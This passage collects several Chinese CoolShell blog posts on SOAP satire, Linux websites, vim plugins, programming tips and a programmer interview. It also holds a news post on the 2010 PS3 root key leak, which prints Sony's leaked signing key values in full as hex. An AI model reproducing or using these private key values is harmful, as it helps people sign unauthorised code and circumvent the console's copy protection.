**SOAP专家** : 老实说，没人真正的知道。**程序员** : 那么，那些 ‘actor’ 和 ‘mustUnderstand’ 属性，是否有人用呢？**SOAP专家** : 没有，真的没人用。你就忽略这些东西吧。**程序员** : 好吧，让我现读一读SOAP的规格说明书。(程序员阅读中……)**程序员** : 好了，我现在几乎可以做个简单的东西了，但是我不能说我喜欢这个远程过程调用RPC的方法以及其序列化对象的方式 。**SOAP专家** : RPC！对象序列化！你从哪得到的SOAP就是一堆RPC的这种印象？! SOAP是关于基于文档的消息传递啊，我的朋友。**程序员** : 但是，这是你说的……**SOAP专家** : 忘了我所说的吧。现在，让我们谈谈消息传递吧。其消息格式遵守XML Schema，我们把之称为新型的文件格式。**程序员** : XML Schema?**SOAP专家** : 哦，这是很不错的东西，未来的头等技术，你应该看一下。**程序员** : (阅读 Schema 规格说明书). 上帝保佑我们！就算是亚历山大帝也搞不定它啊。**SOAP专家** : 不必太担心。会有专门的工作为你来创建XML Schema。真的，这只不过就是工具上的事。
**程序员** : 工具是怎么做的？**SOAP专家** : 好吧，他们反映了你的代码，并自动生成Schema。**程序员** : 反映了我的代码？我以为这只是文档，而不是对象序列化。**SOAP专家** : 你没听我说吗？这只不是工具上的事。总之，我们不能期望你来手写 XML Schema 和 WSDL。另外，这其实就是一种校正测量。你不需要读的。**程序员** : 喔喔，等一下，你刚才说的那个单词是什么？ Wizzdle?**SOAP专家** : 哦，我没有说过吗？WSDL. Web Services Description Language. 它让你指定你的数据类型，参数，操作名，传输绑定，以及endpoint URI，这样，所有的客户程序员就可以访问你的服务了。你应该看看。**程序员** : (阅读WSDL 规格说明书)。我相信那个写下这个文章的人已经被枪杀了。其内部说明都不一致。而且，其用的是HTTP GET绑定，你不是和我说过， GET 是 undefined吗.**SOAP专家** : 不必担心那个，没人会用那玩意。总之，工具会帮你生成WSDL，而且在WDSL里会有Schema的。
**程序员** : 但是，不应该用别的方法吗？不应该是先设计好接口然后再是生成代码吗？**SOAP专家** : 是的，我猜那在原则上听起来是对的。但做起来并不容易，只有很少的SOAP栈支持先开发WSDL。让工具为这个事操心去吧。**程序员** : 还有一个问题。如果我们传递 XML Schema 的消息，我们在哪里指写操作名？**SOAP专家** : 好吧，你还记得 SOAPAction HTTP header吗? 绝大多数的人把操作名放在那里。**程序员** : 大多数人？**SOAP专家** : 嗯，这种新型并不会被写在所有的地方。**程序员** : 我注意到你们整个SOAP界有很多的模糊和歧意，有些地方还是错的，并没有标准的规格说明书。实际上， SOAP 和 WSDL 规格说明书只是 W3C 的笔记罢了，连草稿都不是。**SOAP专家** : 我们还在继续中。**程序员** : 这个真的能行吗？能承诺吗？**SOAP专家** : 绝对没有问题。**程序员** : 好吧，那我去试试。(不久以后……)**程序员** : 事情变得很恶心。我这边的工具生成的WDSL居然不能被我同事的工具使用。还不仅仅是这个，其生成的XML Schemas 无法重用。而且，好像没有工具可以最好的处理SOAPAction header.
**SOAP专家** : 很报歉，兄弟。在光明的那一面，没人用这些文件。为了让传输独立，我们所有人都用包装好的文件。听着是不是很酷：包装好的文件？**程序员** : 那是什么？**SOAP专家** : 就像是原来那样，只不过，你整个消息被 包装起来成一个元素，其和操作有一样的名字。现在操作名和消息成了一体了。**程序员** : 好吧，请问说明书在哪里？**SOAP专家** : 哦，没有规格说明书。这只是Microsoft自己搞的。不过应该是个很不错的主意，挺不错的。然后，这是一个新玩意。我想你一定会喜欢它的—— Web Services Interoperability Group，简称 WS-I，它就是为了移除 SOAP 和 WSDL 规格说明书中的那些歧义。我知道你有多么喜欢规格说明书。**程序员** : 所以，换句话说，原来的那些规格说明书太糟糕了，以致于你需要一个标准化的东西来标准化这些标准。上帝啊。好吧，那么，是否这些协调问题被 解决了？**SOAP专家** : 当然，只要你使用 WS-I 的 SOAP 栈，就可以减少使用80%的 XML Schema，别用任何不同寻常的数据类型，也别期望可以和WebSphere和 Apache Axis一起运行。
**程序员** : 那么，是否包装的文件被在那里被解释了？**SOAP专家** : 没有，但是你的工具会明白的。绝大多数，总之。**程序员** : 让我总结一下，SOAP的定义是不变的，SOAP可以是任何东西，但就是简单，它不再意味着对象访问，就算是所有的工具都那样做。**SOAP专家** : 基本上是对的，但是我们走得比你要远一些。我们不赞成SOAP缩写的含义。**程序员** : 真的！那么SOAP是什么的缩写？**SOAP专家** : 什么也不是，就是SOAP.**程序员** : (无语中……)**SOAP专家** : 下面让我来告诉你什么是 UDDI。（注：我以前还认真地学过SOAP，不过真是学不懂。）原文：来源# 25个Linux相关的网站作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是25个最具有影响力，也是最重要的Linux网站，这些网站提供了Linux的分发包，软件，文件，新闻，以及其它所有的关于Linux的东西。关于Linux的分发包历史，可以看看本站的这篇文章《Linux Distribution Timeline》
1\. Linux.org这个站点主要提供Linux相关的新闻、文档、教程，培训，以及其它一切和Linux相关的东西。这是你需要了解Linux开源社区的总入口。2\. Debian.org如果你想要了解所有关于 Debian 和Linux/GNU 操作系统的相关信息，这个网站是必需要访问的，因为这是Debian的官网。3\. Ubuntu.com这可能是桌面系统上最流行的Linux分发包了。4\. Fedora.comFedora 的官网。Fedora 是一个开放的、创新的、前瞻性的操作系统和平台，基于 Linux。它允许任何人自由地使用、修改和重发布，无论现在还是将来。它由一个强大的社群开发，这个社群的成员以自己的不懈努力，提供并维护自由、开放源码的软件和开放的标准。Fedora 项目由 Fedora 基金会管理和控制，得到了 Red Hat, Inc. 的支持。5\. Novell.comSuSE 也是一个相当不错的Linux分发包，这是SuSE的官网。SUSE Linux 原来是德国的 SuSE Linux AG公司发行维护的Linux发行版，是属于此公司的注册商标。2004年这家公司被Novell公司收购。
6\. OpenSUSE.org现在的 SUSE Linux 由 openSUSE 项目所维护，这个项目的主要目标是使 SUSE Linux 成为最易获得和最广泛使用的Linux，成为最棒的用户Linux桌面环境。7\. RedHat.comLinux红帽子分发包，RedHat致力于服务器和企业级领域的开发。RedHat可能是所有Linux开发包中最挣钱的一个了。8\. Mandriva.comMandriva 分发包的官网。Mandriva 是来自浪漫之国–法国的 Linux 发行套件之一。她是由mandrake和Conectiva两者发展而来的。同样她也提供免费版下载，是最易用的linux发行版本之一。现在最新版本是Mandriva Linux 2009。新人推荐使用。Mandriva Linux（原先的Mandrakelinux）创建于1998年，它以使Linux对每一个人都易用 为目标。当时Linux作为操作系统已经以强大和稳定而闻名，但它要求人们有很强的专业知识，并涉及大量的命令行操作。MandrakeSoft认为这是一个将最好的图形桌面环境以及它自己的图形界面配置工具集成到Linux中的机会，并且很快就以作为Linux易用性和功能性的典范而著称。Mandriva Linux以易用和令人愉快的软件环境，向个人用户和企业用户提供了Linux的所有强大功能和稳定性。每天都有成千上万的用户在初识Linux并发现它可以完全替代之前所使用的操作系统。无论是作为服务器还是工作站，Linux都用不着去妒嫉任何其他更广为采用的操作系统。
9\. Linux Mint.comLinux Mint分发包的官网。Linux Mint是一份基于Ubuntu的发行，其目标是提供一种更完整的即刻可用体验，这包括提供浏览器插件、多媒体编解码器、对DVD播放的支持、Java和其他组件。它与Ubuntu软件仓库兼容。10\. PCLinuxOS.comLinux 的 PCLinuxOS 分发包。PCLinuxOS是一份优秀的发行版，在国外很流行，在distrowatch.com的关注度与Ubuntu、Fedora、openSUSE不分高下。11\. CentOS.orgCentOS 官网。CentOS计划所推出──全名为”社区企业操作系统”（Community Enterprise Operating System）的这个计划是在2003年红帽决定不再提供免费的技术支持及产品认证之后的部份”红帽重建者”（Red Hat rebuilders）之一。redhat.com发布redhat 9(简写为rh9)后，不再开发redhat 10,11…,全面转向redhat enterprise linux(简写为rhel)的开发，和以往不同的是,新的rhel 3要求用户先购买lisence,redhat.com承诺保证产品的稳定性，安全性。rhel 3二进制代码不再提供下载，而是作为redhat 服务的一部分，但源代码依然是open。所以有了centos ,whitebox,dao 等等一批open source的企业版本，其中centos最为活跃。
12\. Simply MEPISMEPIS 分发包官网。MEPIS Linux是一份Linux桌面系统，它也能被方便地配置成专用的服务器。它被设计为同时适合于个人和商用目的。它拥有最新的特性，例如它是一张自启动运行/安装/修复光盘，以及自动配置硬件，NTFS分区大小调整支持，ACPI电源管理，WiFi支持，反混淆TrueType字体，个人防火墙，KDE桌面等等。13\. PC BSDPCBSD是基于FreeBSD的以桌面应用为目的的操作系统。PCBSD默认安装KDE桌面.它提供LINUX兼容模式，可以使用linux中优秀的媒体工具、办公软件，你可以像linux桌面版一样使用它。与FreeBSD的区别：PCBSD主要面向桌面应用，而FreeBSD主要针对服务器。PCBSD基于FREEBSD内核与KDE桌面，FreeBSD默认情况下是命令行界面14\. Distrowatch.com这是个非常不错的网站。你可以从这个网站上了解到所有Linux分发包的新闻和信息。15\. Tuxmachines.orgTuxmachines.org 也是一个提供所有和Linux相关信息的网站。16\. Linux Kernel
相了解Linux的内核的吗？这个网站你不能不去。这个网站上拥有世界上对Linux最狂热的人。17\. Linux Planet也是一个关于Linux文章和信息的网站。如果你想跟上Linux的步伐，你需要经常上这个网站。18\. Tuxs.org一个提供指南和教程的linux的站点。19\. Linux Foundation这是Linux专家级的站点，上面有很多新闻，文章等等。20\. Linuxgazette.com一个专家云集的BLOG社区。21\. Linux JournalLinux Journal团队的官网，提供了大量的How-To，教程，以及其它很多的Linux信息和技术文章。22\. Linux InternationalLinux International 一个 vendor 组织其主要促进Linux操作系统。23\. Linux HeadquartersLinux总部。又是一个很不错的网站，提供了很多关于Linux的新闻，链接，通知等等。24\. Linux Documentation Project这是一个基于Web站点的项目，其想要提供一个完整的质量上乘的Linux文档。也是一群充满激情的Linux狂热份子。
25\. Linux WorldLinux World 主要面对的是企业级的应用和实现。这个网站提供了很多机会、技术和新闻，以及很多解决方案。# 几个有趣的404错误页面作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnWindows的经典蓝屏IE经典的404错误（但却又不一样）出错的时候不忘让你学习学习HTTP的返回码漫画式的出错(这样的方法可能会很多)废话！当然是文件找不到！ASCII码拼成的404出错了，那就玩个游戏吧随机搞笑图片终端界面式的超级玛丽流程图生活中的404通缉不存在的页面电视屏幕型# 【引文】如何用Python往Google Spreadsheet上写数据作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn现代企业里，数据决定着方向，人们都想随时看到各种报表。很多项目可能都需要dashboard一类的工作，把分散的数据变成一些能随时查看实时数据的图表，这个工作有两个环节：1. 把数据汇集起来，放入CSV或者数据库   2. 一个服务器端的程序能够读到这写数据，根据需要生成在线的图表 （离线的也可以，那样每次人们想看这些图的时候都会来麻烦你，如果你在度假，他们会想敲开你的电脑）
第一步可以通过定期跑些脚本完成，但是第二步有时候就不太容易了，如果你希望你的图表能够让所有人方便随时查看，最方便的给出一个URL能让人随时访问，Google的在线文档可以提供一个简单的解决方案。但是，如何将数据自动弄到在Google spreadsheet 上呢？手动的copy/paste是一个方法，但是很费人工，最简单的方法就是写个脚本把这个流程自动化。如何将数据写进Spreadsheet (在线表单)呢？请参考下文：Write to a Google Spreadsheet from a Python script注：这是个搜索方面比较大拿的Googler的博客。# 将vim变得简单:如何在vim中得到你最喜爱的IDE特性作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn原文出处:这里**摘要：**   开源的vim文本编辑器提供许多灵活而强大的功能，但是vim自身是很难被配置使用的，在本教材中，我们将向你显示通过几个简单的方式使得你的vim具有集成开发环境IDE的行为vim是很多程序员和系统管理员最爱的文本编辑器，虽然他提供了很多优秀而灵活的功能，但是对于新手来说他依然是难于上手的。从传统集成开发环境转到vim的开发人员通常会开在发方式的转变中发现迷失了自己。
我经常收到来自于读者的邮件，他们希望能找到一种方式使得vim变得对开发者更友好。一个常见的抱怨是vim并不是自身就带有IDE的特性，并且如何来通过配置能得到等价IDE功能也不是很清晰。而揭开vim真正神奇的秘密就是利用强大的vim插件系统和对vim自身功能的改善和增强的第三方脚本。在阅你读本文之前，我已经整理好了一个vim的有用tips和插件列表，这些列表中的内容将会使那些用惯IDE功能的人们在vim上感到宾至如归的感觉。虽然vim主要是设计给基于字符方式的文本编辑器，并且它有可能是这类编辑器中最高效的工具，但是现在在vim上也存在一些更适合新手使用的基于图形的外壳。不像运行在终端窗口上的vim，你可以尝试使用一下gvim,一个基于GUI的vim版本。gvim拥有可配置的的菜单和工具条，因此可以通过鼠标直接访问到vim的编程上的最本质的特性。gvim可以让你使用操作系统自带的文件对话框，并允许你通过鼠标点击拖拉编辑面板的能力。gvim有windows和linux的版本，等价的Mac OS X的版本是MacVim，MacVim提供了Mac机的本地Cocoa用户接口，包括菜单集成的功能。   !vimtxt_gvim_ars
我听到来自vim用户最经常被抱怨的功能是vim的编辑区列表非常麻烦，并且没有一种简单的方式可以明了的看到什么文件是打开的。在vim上有几个插件可以解决这个问题，并提供了一个额外的编辑区列表用于方便在打开文件中切换。我最喜欢的一个插件是MiniBufExplorer，它将列表显示在窗口的头上。当MiniBufExplorer被激活时，你可以通过tab键来在列表的这些项中循环，然后通过回车键或双击鼠标来选择在编辑区显示和你要处理的文件。   !vimtxt_vim_minibufexplorer_ars许多的IDE工具都有用于显示你程序项目结构和允许你通过鼠标在特定的类和方法间跳转的代码导航区。你可以通过使用流行的Tag List 插件来得到这个特性。这个插件需要Exuberant Ctags实用工具，这个工具用于分析你的代码。TagList可以通过命令:Tlist来激活，并将你的类和方法显示在激活的区域，当你打开其他的文件或切换到其他打开文件时，新的类或方法会被加到代码导航区。在gvim中你可以通过单击方法名跳到对应方法定义。如果要使用键盘，那么通过光标键上下移光标到你希望的方法处，单击回车即可达到目标。
!vimtxt_vim_taglist_ars自动文本完成( **译者注** ：就是eclipse，visual studio中常见的输入前几个字符后面的内容通过列表显示的功能)是另外一种在IDE工具中常用特性，并且很多用户都希望在vim中有这些特性。这个特性已经在vim7中通过Omnicompletion system被引入进来。它是可编程，这就意味着你可以通过定制，使的这个功能能在各种个样的编程语言中使用，在vim中甚至存在对动态语言python或ruby生效的自动文本完成功能。现在，自动文本完成的配置已经变成了vim包中的一个部分，所以现在你可以什么都不做就能让这个功能生效。要调出自动完成菜单(列表)，你需要敲下ctrl+x和ctrl+o键，接着你可以用ctrl+n和ctrl+p在可能完成列表中进行上下选择，当你移动到一个选项，vim将为你在另外一个Scratch区域显示带方法说明和属性的上下文帮助信息。   !vimtxt_vim_completion_ars你可以多种方式来改善你的vim体验，vim维基vim wiki和脚本库script repository为你提供了可用于增强功能的第三方增强扩展集合。这些插件实现sinppet system，outlining tools，项目管理工具，和大量的其他的特性。同时还有大量的脚本实现了对某些特定编程语言和框架的增强。例如有一个非常流行的脚本，这个脚本将会改善你Ruby的语法高亮，并且为你Ruby on Rail的部署提供了非常方便的导航特性
同时也有一些面向新手的脚本集合，这个集合使得vim的行为变得更像一个带有简单菜单和快捷键的传统的文本编辑器。如果你对vim那些神秘键盘命名感到不舒服的话，你可以选择这个作为你使用vim的开始。vim的多样性使得它满足不同的用户使用。对于那些没有时间，能力，和爱好去通过自己去建立一个完美vim配置的人来说，无数的第三方脚本和插件为你提供了一种简单的方式，通过这种方式你可以付出很少的努力就能得到你想要的功能和特性。*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 有效编程的14件事作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是14件如何有效编程的方法：1. 目录* 计划(Plan)     * 使用伪代码     * 书写清楚的注释     * 使用自动的编辑工具     * 减少代码     * 代码重用     * 代码重构     * 使用设计模式     * 使用程序框架Framework     * 泛型编程     * 使用开源的代码     * 完善开发环境     * 使用调试器     * 使用版本管理工具
#### 计划(Plan)所谓Plan，其实就是对应于编程中的“设计”阶段，当然，这里的Plan并不像设计那样重量级。它要求我们程序员在正式编程前至少要考虑一下下面的问题：* 你这个程序，工具或是项目的目的，究竟是用来干什么的。你只有知道做什么，要达到什么样的目的，你才能做得对，做得好。     * 需要有什么样的功能。需要你给出来个功能列表。这样可以保证我们不会遗露了什么。     * 准备好一些技术难题的前期调查和解决方案。不要等到开始编程的时候才去想。下面这你因为有“Plan”而得到的好处：* 你能够清楚地明白你要做的东西长什么样？     * 你能清楚知道你要开发的东西要干些什么事？     * 你能够在开发过程中解决你所有可能发生的难题。2. #### 使用伪代码伪代码是一个非常不错的方式，让你可以看到你要写的程序长什么样？根据 维基百科(Wikipedia)，伪代码被写定义成这样：> > 伪代码是一个紧凑和非正式的从高层描述一个计算机编程算法的结构约定。其主要是为了让人阅读而不是让计算机执行。典型的伪代码一般会忽略那些算法中不需要人去关心的细节。比如：变量声明，系统调用，或是子程序。在伪代码中，编程语言被自然的人类语言所增强而放大，从而，更方便，更紧凑。
一些人并不喜欢伪代码，因为他们并不相把同样的代码写两遍，一遍是伪代码，一遍是真代码。其实，这是可以理解的，因为两个copy的东西是比较不好维护的。但是我想，这是可以权衡的，如果的算法很简单，那么就不需要伪代码了，如果你的算法比较复杂，比较绕，那么，有一个伪代码提纲挈领将会是一件非常不错的事情，因为他有利于让别人从一个简单的文档来了解一个复杂的算法或系统。这就好像一个电线的布线图一样，你可以很容易地通过一个简单的文档从复杂的实现中找到头绪。3. #### 书写清楚的注释请在你的代码中书写清楚的程序注释。当然，注释不是越多越好，注释应该是简明扼要的，如果你的程序足够地清楚简单，那么注释就会显的多余。另外，注释应该是注释“原因，理由，目的”，而不是注释“是什么”，在“酷壳”的另一篇文章《惹恼程序员的十件事》中，有一条就是关于坏的注释是多么的另个讨厌。4. #### 使用自动的编辑工具自动的编辑工具有很多，比如 Typinator，这是一个可以通过设定一些替代的简单代码来实现重复语句的快捷插入，比如你自己的签名、常用的语句等等，通过它可以设定替代的简短代码。还有其它一些代码自动完成的工具，比如一些VC的插件，还有像Source Insight这样的东西。别小看这一点点时间，如果你每天都在写代码的话，今天一点点，明天一点点，将会为你省出很多的时间。
5. #### 减少代码减少代码的数量，坚持DRY（Don’t Repeat Yourself） 和KISS（Keep It Simple & Stupid） 原则。这样可以有交物减少代码的复杂度，提高程序的易读性和可维护性，同时也能增加代码的质量。6. #### 代码重用DRY (don’t repeat yourself) 原则就是告诉我们需要重用现有的代码。这样，你才能够站在巨人的肩膀之上，从而可以更多的关注和自己所要处理业务的逻辑。编程的最高境界就是写出来的代码是可能被重用的，重用和泛型这是编程里始终在追求的目标。7. #### 代码重构一些老的代码可能已经不合时宜了，比较以前老的C++的STL库在多线程下可能会出现很多问题。所以，我们自己的代码也是一样的，每过一段时间，我们需要把这些代码回收再利用，这就是软件的重构。重构代码所追求的并不是要提供更多的功能，而是让老的代码更有生命力，让老的代码跟上时代，更具扩展性，灵活性。8. #### 使用设计模式设计模式是一种从代码级解决某一些问题的方法论。这个世界上有很多很多的设计模式，比如MVC，单实例，工厂，观察者等等，等等。使用好的设计模式可以让你的代码更具重用和扩展性。关于设计模式，请参看本站的另一篇文章《101个设计模式》
9. #### 使用程序框架FrameworkFrameworks 是一份给程序员的礼物，他们帮助你完成了很多很细节的事情，他们有可能是一个lib库，你需要进行简单的拼装，一个几乎完成了的软件框架就已形成。这是一个能够给开发工作提速的东西。只要上网随便搜一搜，你可以看到太多太多的框架了。形形色色，几乎都是开源社区贡献的。10. #### 泛型编程如果抽像出一些程序中相似的东西，然后把这些相似的东西用一个标准的东西实现，这也是编程所追求的最高境界之一，像诸如C++中的STL之类的东西就是此类东西的最佳体现。灵活之及，几乎都快放之四海皆准了。11. #### 使用开源的代码这个世界上有太多太多开源的代码了。学会利用他们可以让你更节省时间和精力，因为我们完全没有必要把相当的东西实现若干次，学会使用开源的代码不但是一个学习的过程，同样也是一个增加编程效率的事情。12. #### 完善开发环境开发环境非常重要，因为好的开发环境可以让你事倍功半。他们可以让你不需要关注别的东西，比如，我曾看过某程序员在调整编辑器的字体和高亮上花费了不少工夫。是的，这是值得肯定了，只有把开发环境变得舒服，才能让自己更好的编程。
13. #### 使用调试器学会使用调试器来调试代码，单步跟踪，变量值跟踪，内存，堆栈等等。熟练地使用调试器可以让你更好的查找程序的问题，以得到最优的代码。14. #### 使用版本管理工具版本管理工具应该是任何程序员都应该要去学会使用的东西，特别在一个团队中，如何管理程序的不同版本，如何维护，存放代码，版本管理工具绝对是开发过程中不可少的东西。其意义绝对不只代码备份和共享那么简单。下面是一些开源的管理管理工具：Git，SVN，CVS和Bazaar。# Sony PS3 Root Key 被破解作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn著名的黑客George “GeoHot” Hotz（其也帮助破解了iPhone）宣称破解了Sony P3的root key（也称front door key），并将这个key公布于  （墙）。不但发布了root key，还做了一个hello world。Youtube上也有一个相关的视频：http://www.youtube.com/watch?v=UkLSXsCKDkgerk: C0 CE FE 84 C2 27 F7 5B D0 7A 7E B8 46 50 9F 93 B2 38 E7 70 DA CB 9F F4 A3 88 F8 12 48 2B E2 1B     riv: 47 EE 74 54 E4 77 4C C9 B8 96 0C 7B 59 F4 C1 4D     pub: C2 D4 AA F3 19 35 50 19 AF 99 D4 4E 2B 58 CA 29 25 2C 89 12 3D 11 D6 21 8F 40 B1 38 CA B2 9B 71 01 F3 AE B7 2A 97 50 19     R: 80 6E 07 8F A1 52 97 90 CE 1A AE 02 BA DD 6F AA A6 AF 74 17     n: E1 3A 7E BC 3A CC EB 1C B5 6C C8 60 FC AB DB 6A 04 8C 55 E1     K: BA 90 55 91 68 61 B9 77 ED CB ED 92 00 50 92 F6 6C 7A 3D 8D     Da: C5 B2 BF A1 A4 13 DD 16 F2 6D 31 C0 F2 ED 47 20 DC FB 06 70
之所以叫“front door key”，其是相对于“back door” 而言，传统的破解一般是通过软件的某个 bug或是后门来破解。而这次的PS3走的是前门，这就是说——这已经不是破解了，这是完全意义上的PS3正版了。为什么呢。这和PS3的开发有关。其很像Symbian 的Sign，也就是说，游戏开发商要想让他们的游戏在PS3上发布，其需要把游戏通过法律流程交给Sony，然后被Sign上一个key，就可以成为正式的发行版并可在所有用户的PS3上运行了。所以，这个key是PS3到今天没有盗版游戏的关键。不过随着这个key被找到，这意味着任何人都可以在PS3上发布软件了。最要命的是，这个Key和PS3的硬件绑定，也就是说， **如果Sony要阻止这个事的话，无法通过升级firmware完成，必需更换硬件！！****   **目前，SONY正式对PS3的Root Key被公布导致可以进行自制系统开发的问题进行回应。SONY表示目前正在进行相关调查，问题会通过网络更新进行解决，具体情况涉及信息安全问题不便透露。不过之前黑客集团表示除非Sony出新硬件否则无法修正这一情况，Sony应该会接受这一事实。
而最新的PS3 Custom Firmware Creator应该是把PS3送上断头台了。而且已经证实，3.55的玩友可以安装3.55的CFW自制系统，安裝之后可以正常运行正版游戏，可以通过选项菜单中多出的pkg安裝功能，安裝u盘里通过电脑下载的游戏更新补丁或是游戏的试玩版。 **现在的PS3就像一个PC机，等待着各种不受Sony控制的软件的到来……**（另：Freebsd宣布支持索尼的游戏机PS3，支持的型号是索尼Playstation 3 Fat版，固件版本号< 3.21 （最新的固件版本是3.55版），必须能网络启动。不过，因为黑客已经破译了root key，并允许创作自制固件，因此未来Freebsd或能支持所有版本的PS3。）# 对九个超级程序员的采访作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn原文：《Q&A With Nine Great Programmers》时间有限，我只能粗译，难免错误。**这篇访谈源自2006年，最先发布在波兰程序员 Jaroslaw “sztywny” Rzeszótko (AKA “Stiff”) 的博客上。但是这篇博文现在找不到了。非常感谢他能授权我重新发布这个博文。**
_在一个炎热无聊的下午，我突发奇想。我想通过电子邮件的方式对那些我非常感兴趣和非常敬重的程序员问10个问题。准备这10个问题我只花了5分钟，这些都是我个人想问他们的问题，所以，我基本上没想太多要问他们什么。最后两个问题和编程没有什么关系，我就是想问题这些人的一些兴趣爱好。另外，不是每一个人都想回答我的，这是我第一次做“访谈”，所以，我犯了一些错误，一些问题没有得到回答。不管怎么样，我得到了很多很有意思的内容，所以，这对我绝对是一次很有意义的经历。_   ___并不是每一个人都回了我的邮件，也并不是每一个人都同意回答我的这些问题，也许在我发布这篇文章后我会得到那些回答，但是我已经迫不及待想把这些东西发布了，所以，我可能会更新这篇文章（更新：2006年3月8日，我收到了 _Bjarne Stroustrup的回信_ ）__— Jaroslaw_目录* 介绍   * Q 1: 你是怎么学编程的？是从学校里学的吗？或者你没有上过学:) ？   * Q 2: 你们觉得对程序员最重要的事是什么？   * Q 3: 你是否认为数学和/或物理是一种很重要的编程技能？为什么？   * Q 4: 关于编程，你们认为接下来的大事是什么？X-Oriented编程，Y语言，量子电脑 ？   * Q 5: 如果你有3个月学一个相对较新的技术，你会学什么？   * Q 6: 你们觉得如何让一些程序员可能有超过其它程序员10倍或100倍的生产力？   * Q 7: 什么工具是你的最爱（操作系统，编程/脚本语言，文本编辑器，版本管理，shell，数据库，或其它没它你活不了的工具），为什么不是别的？   * Q 8: 你最喜欢的编程书是什么？   * Q 9: 你最喜欢的和编程无关的一本书是什么？   * Q 10: 你最喜欢的乐队/演奏家/作曲家？   * 补充说明
#### 介绍* **Linus Torvalds** – Linux kernel 作者。* **Dave Thomas**) – “Pragmatic Programmer”(注：douban) 和 “Programming Ruby”(注：douban) 以及其它一些优秀书籍的作者。 你可以在 这里 读读他对编程的一些想法。* **David Heinemeier Hansson** – Rails Framework 作者- 一个目前最新最热的Web开发框架。他的blog在 这里. （陈皓注：他也是37signals的领导人之一）* **Steve Yegge** – 他可能并不那么知名，但是他给了很多有意思的回答。他有一个很火的关于编程的 blog，他也是游戏 “Wyvern” 的作者。（陈皓注：他最火的是去年在google+上对google和amazon的吐槽，06年他应该在google了）* **Peter Norvig** – Research Director at Google, 知名的 Lisper，AI书的著名作家，个人主页。* **Guido Van Rossum** – Python 发明者。
* **Bjarne Stroustrup** – C++发明者， 个人主页。* **James Gosling** – Java 发明者。* **Tim Bray** – XML 和 Atom 规格说明书作者之一 个人博客 。#### Q 1: 你是怎么学编程的？是从学校里学的吗？或者你没有上过学:) ？**_Steve Yegge_**在我17岁的时候，我在HP的计算器中用他们的RPN 栈语言自学编程的。在这之前，我尝试过学习编程一两次，但都没有学成。HP 28c 和 48g 的科学计算器是一个很牛的东西，而且还有不错的文档。我搞了一本3D图形的书，并很费力地把其中的Pascal语言转成RPN栈语言，并用48g写了一个3D的线框图渲染图。运行的还不错，在我买了PC和Turbo Pascal之后，我开始认真地学习编程。在我进入大学计算机科学专业之前，我已经是一个不错的程序员了。我在华盛顿大学拿到了计算机科学学位，这绝对是有价值的，所以，我建议所有的程序员都应该得到计算机科学专业的学位。**_Linus Torvalds_**我没有在学校里学过编程，我在主要是读我自己想读的书，或是就直接去编程 (一开始在 Commodore VIC-20 学编程， 然后是 Sinclair QL上编程)。
当然，我觉得上大学非常有用。我没有去一个工科大学，我上了赫尔辛基大学，这是一个比较偏理论的大学，所以，那里的教育并没有那么多的编程的东西（编程只是很少一部分），这里大多数的课程都倾向于教一些基础概念的东西，如：复杂性分析。看上去很无聊，甚至有点浪费时间，但是我还是觉得这些课有用，我对大多数课都还比较enjoy。所以，我觉得我可能在这些方面是一个比较好的程序员。**_David Heinemeier Hansson_**我学编程是从用HTML做我的第一个网页开始的。那时，我想当我的网页能动态地显示一些内容，所以，我选择了ASP和PHP。在做完这个网页后，我知道了怎么去编程，于是我开始我的计算机科学和商业管理学位的学习。**_Peter Norvig_**我是从高中和大学课程中学编程的，但是我还是觉得我自己学得更多。**_Dave Thomas_**我是在高中学编程的。我完全地迷住了，我对编程爱得无法自拔，然后，我开始挑选那些提供软件开发课程的大学。最终，我去了伦敦大学的帝国学院。第二年我就开始学习软件开发的课程了，那绝对是非凡的，学生和教员在一起工作把教材做得更好，每一个人都可以从中学到很多。这些课程给了我难以置信和非常雄厚的软件开发背景。我在那里读到了博士，最后去创业了。
关于“我是怎么学编程的”这个问题，我的回答是“我现在还在学编程”。我认为好的程序员一生都在学编程。这并不是去学一门语言或是一个代码库，好的程序员会对他们的编程技艺一年又一年地精益求精。**_Guido Van Rossum_**我去的那个大学有一个大型主机和很多不同的计算机课程。这对我很重要。**_James Gosling_**起初，我是自学的。在我去上大学之前，我就找到了一份程序员的工作。但是我很高兴我去了大学，在那里有很多乐趣，最终我学到了博士。**_Bjarne Stroustrup_**我先上的是Aarhus大学， 然后是 剑桥大学(Cambridge)，这两个大学教了我很多很有用的东西，这些东西为了以后的工作打下了基础。另外，我对编程和钱的关系学得非常好——知道了真实世界的问题，正确性，维护性，准时交付，等等，这些比教育可能更重要。**_Tim Bray_**我本来想去做一个数学老师的。但是，那个学数学的大学要我去学几个计算机的课。#### Q 2: 你们觉得对程序员最重要的事是什么？**_Steve Yegge_**沟通能力（写和说）。除非你可以让你的想法更有效率地传递出去，否则你不可能做得比编程更多的事。程序员应该疯狂地阅读，锻炼写作能力，参加一些写作培训课程，甚至锻炼在公开场合演讲的能力。
**_Linus Torvalds_**It’s a thing I call “taste”. 有一件事，我把它叫做“品味”。我倾向于不从熟练程度来评判那些和我工作过的人。这些人能非常艰苦地写出很多代码，但是我想从他们对别人的代码的反应做出评判，这样我们就可以明白他们自己写的代码怎么样，知道他们使用的方法怎么样。他们对别人的评判还告诉我，他们是不是有好的“品味”。是这样的，如果一个人没有“好的品味”，那么他一般不会很好的评判他人的代码，他自己写的代码通常也不会很好。哦，这并不只是唯一的事。还有一件事，尤其在开源项目里，那是他是否有能力能和别人进行简单的沟通，告诉别人他要干什么，怎么干。这个能力可以告诉别人为什么你干的事是非常重要的，并不是所有的人都有这个能力。也就是说，有一些人可以写出很不错的代码，但他们并不一定能解释这些代码，他们也并不一定有好的品味，但是代码可以运行得不错。有时，你需要另一个人（有那种不错的品味的人）把他的代码转成更好的形式。也就是说，任何一个程序员都需要那种可以用清晰的代码来解决复杂问题的基础能力。**_David Heinemeier 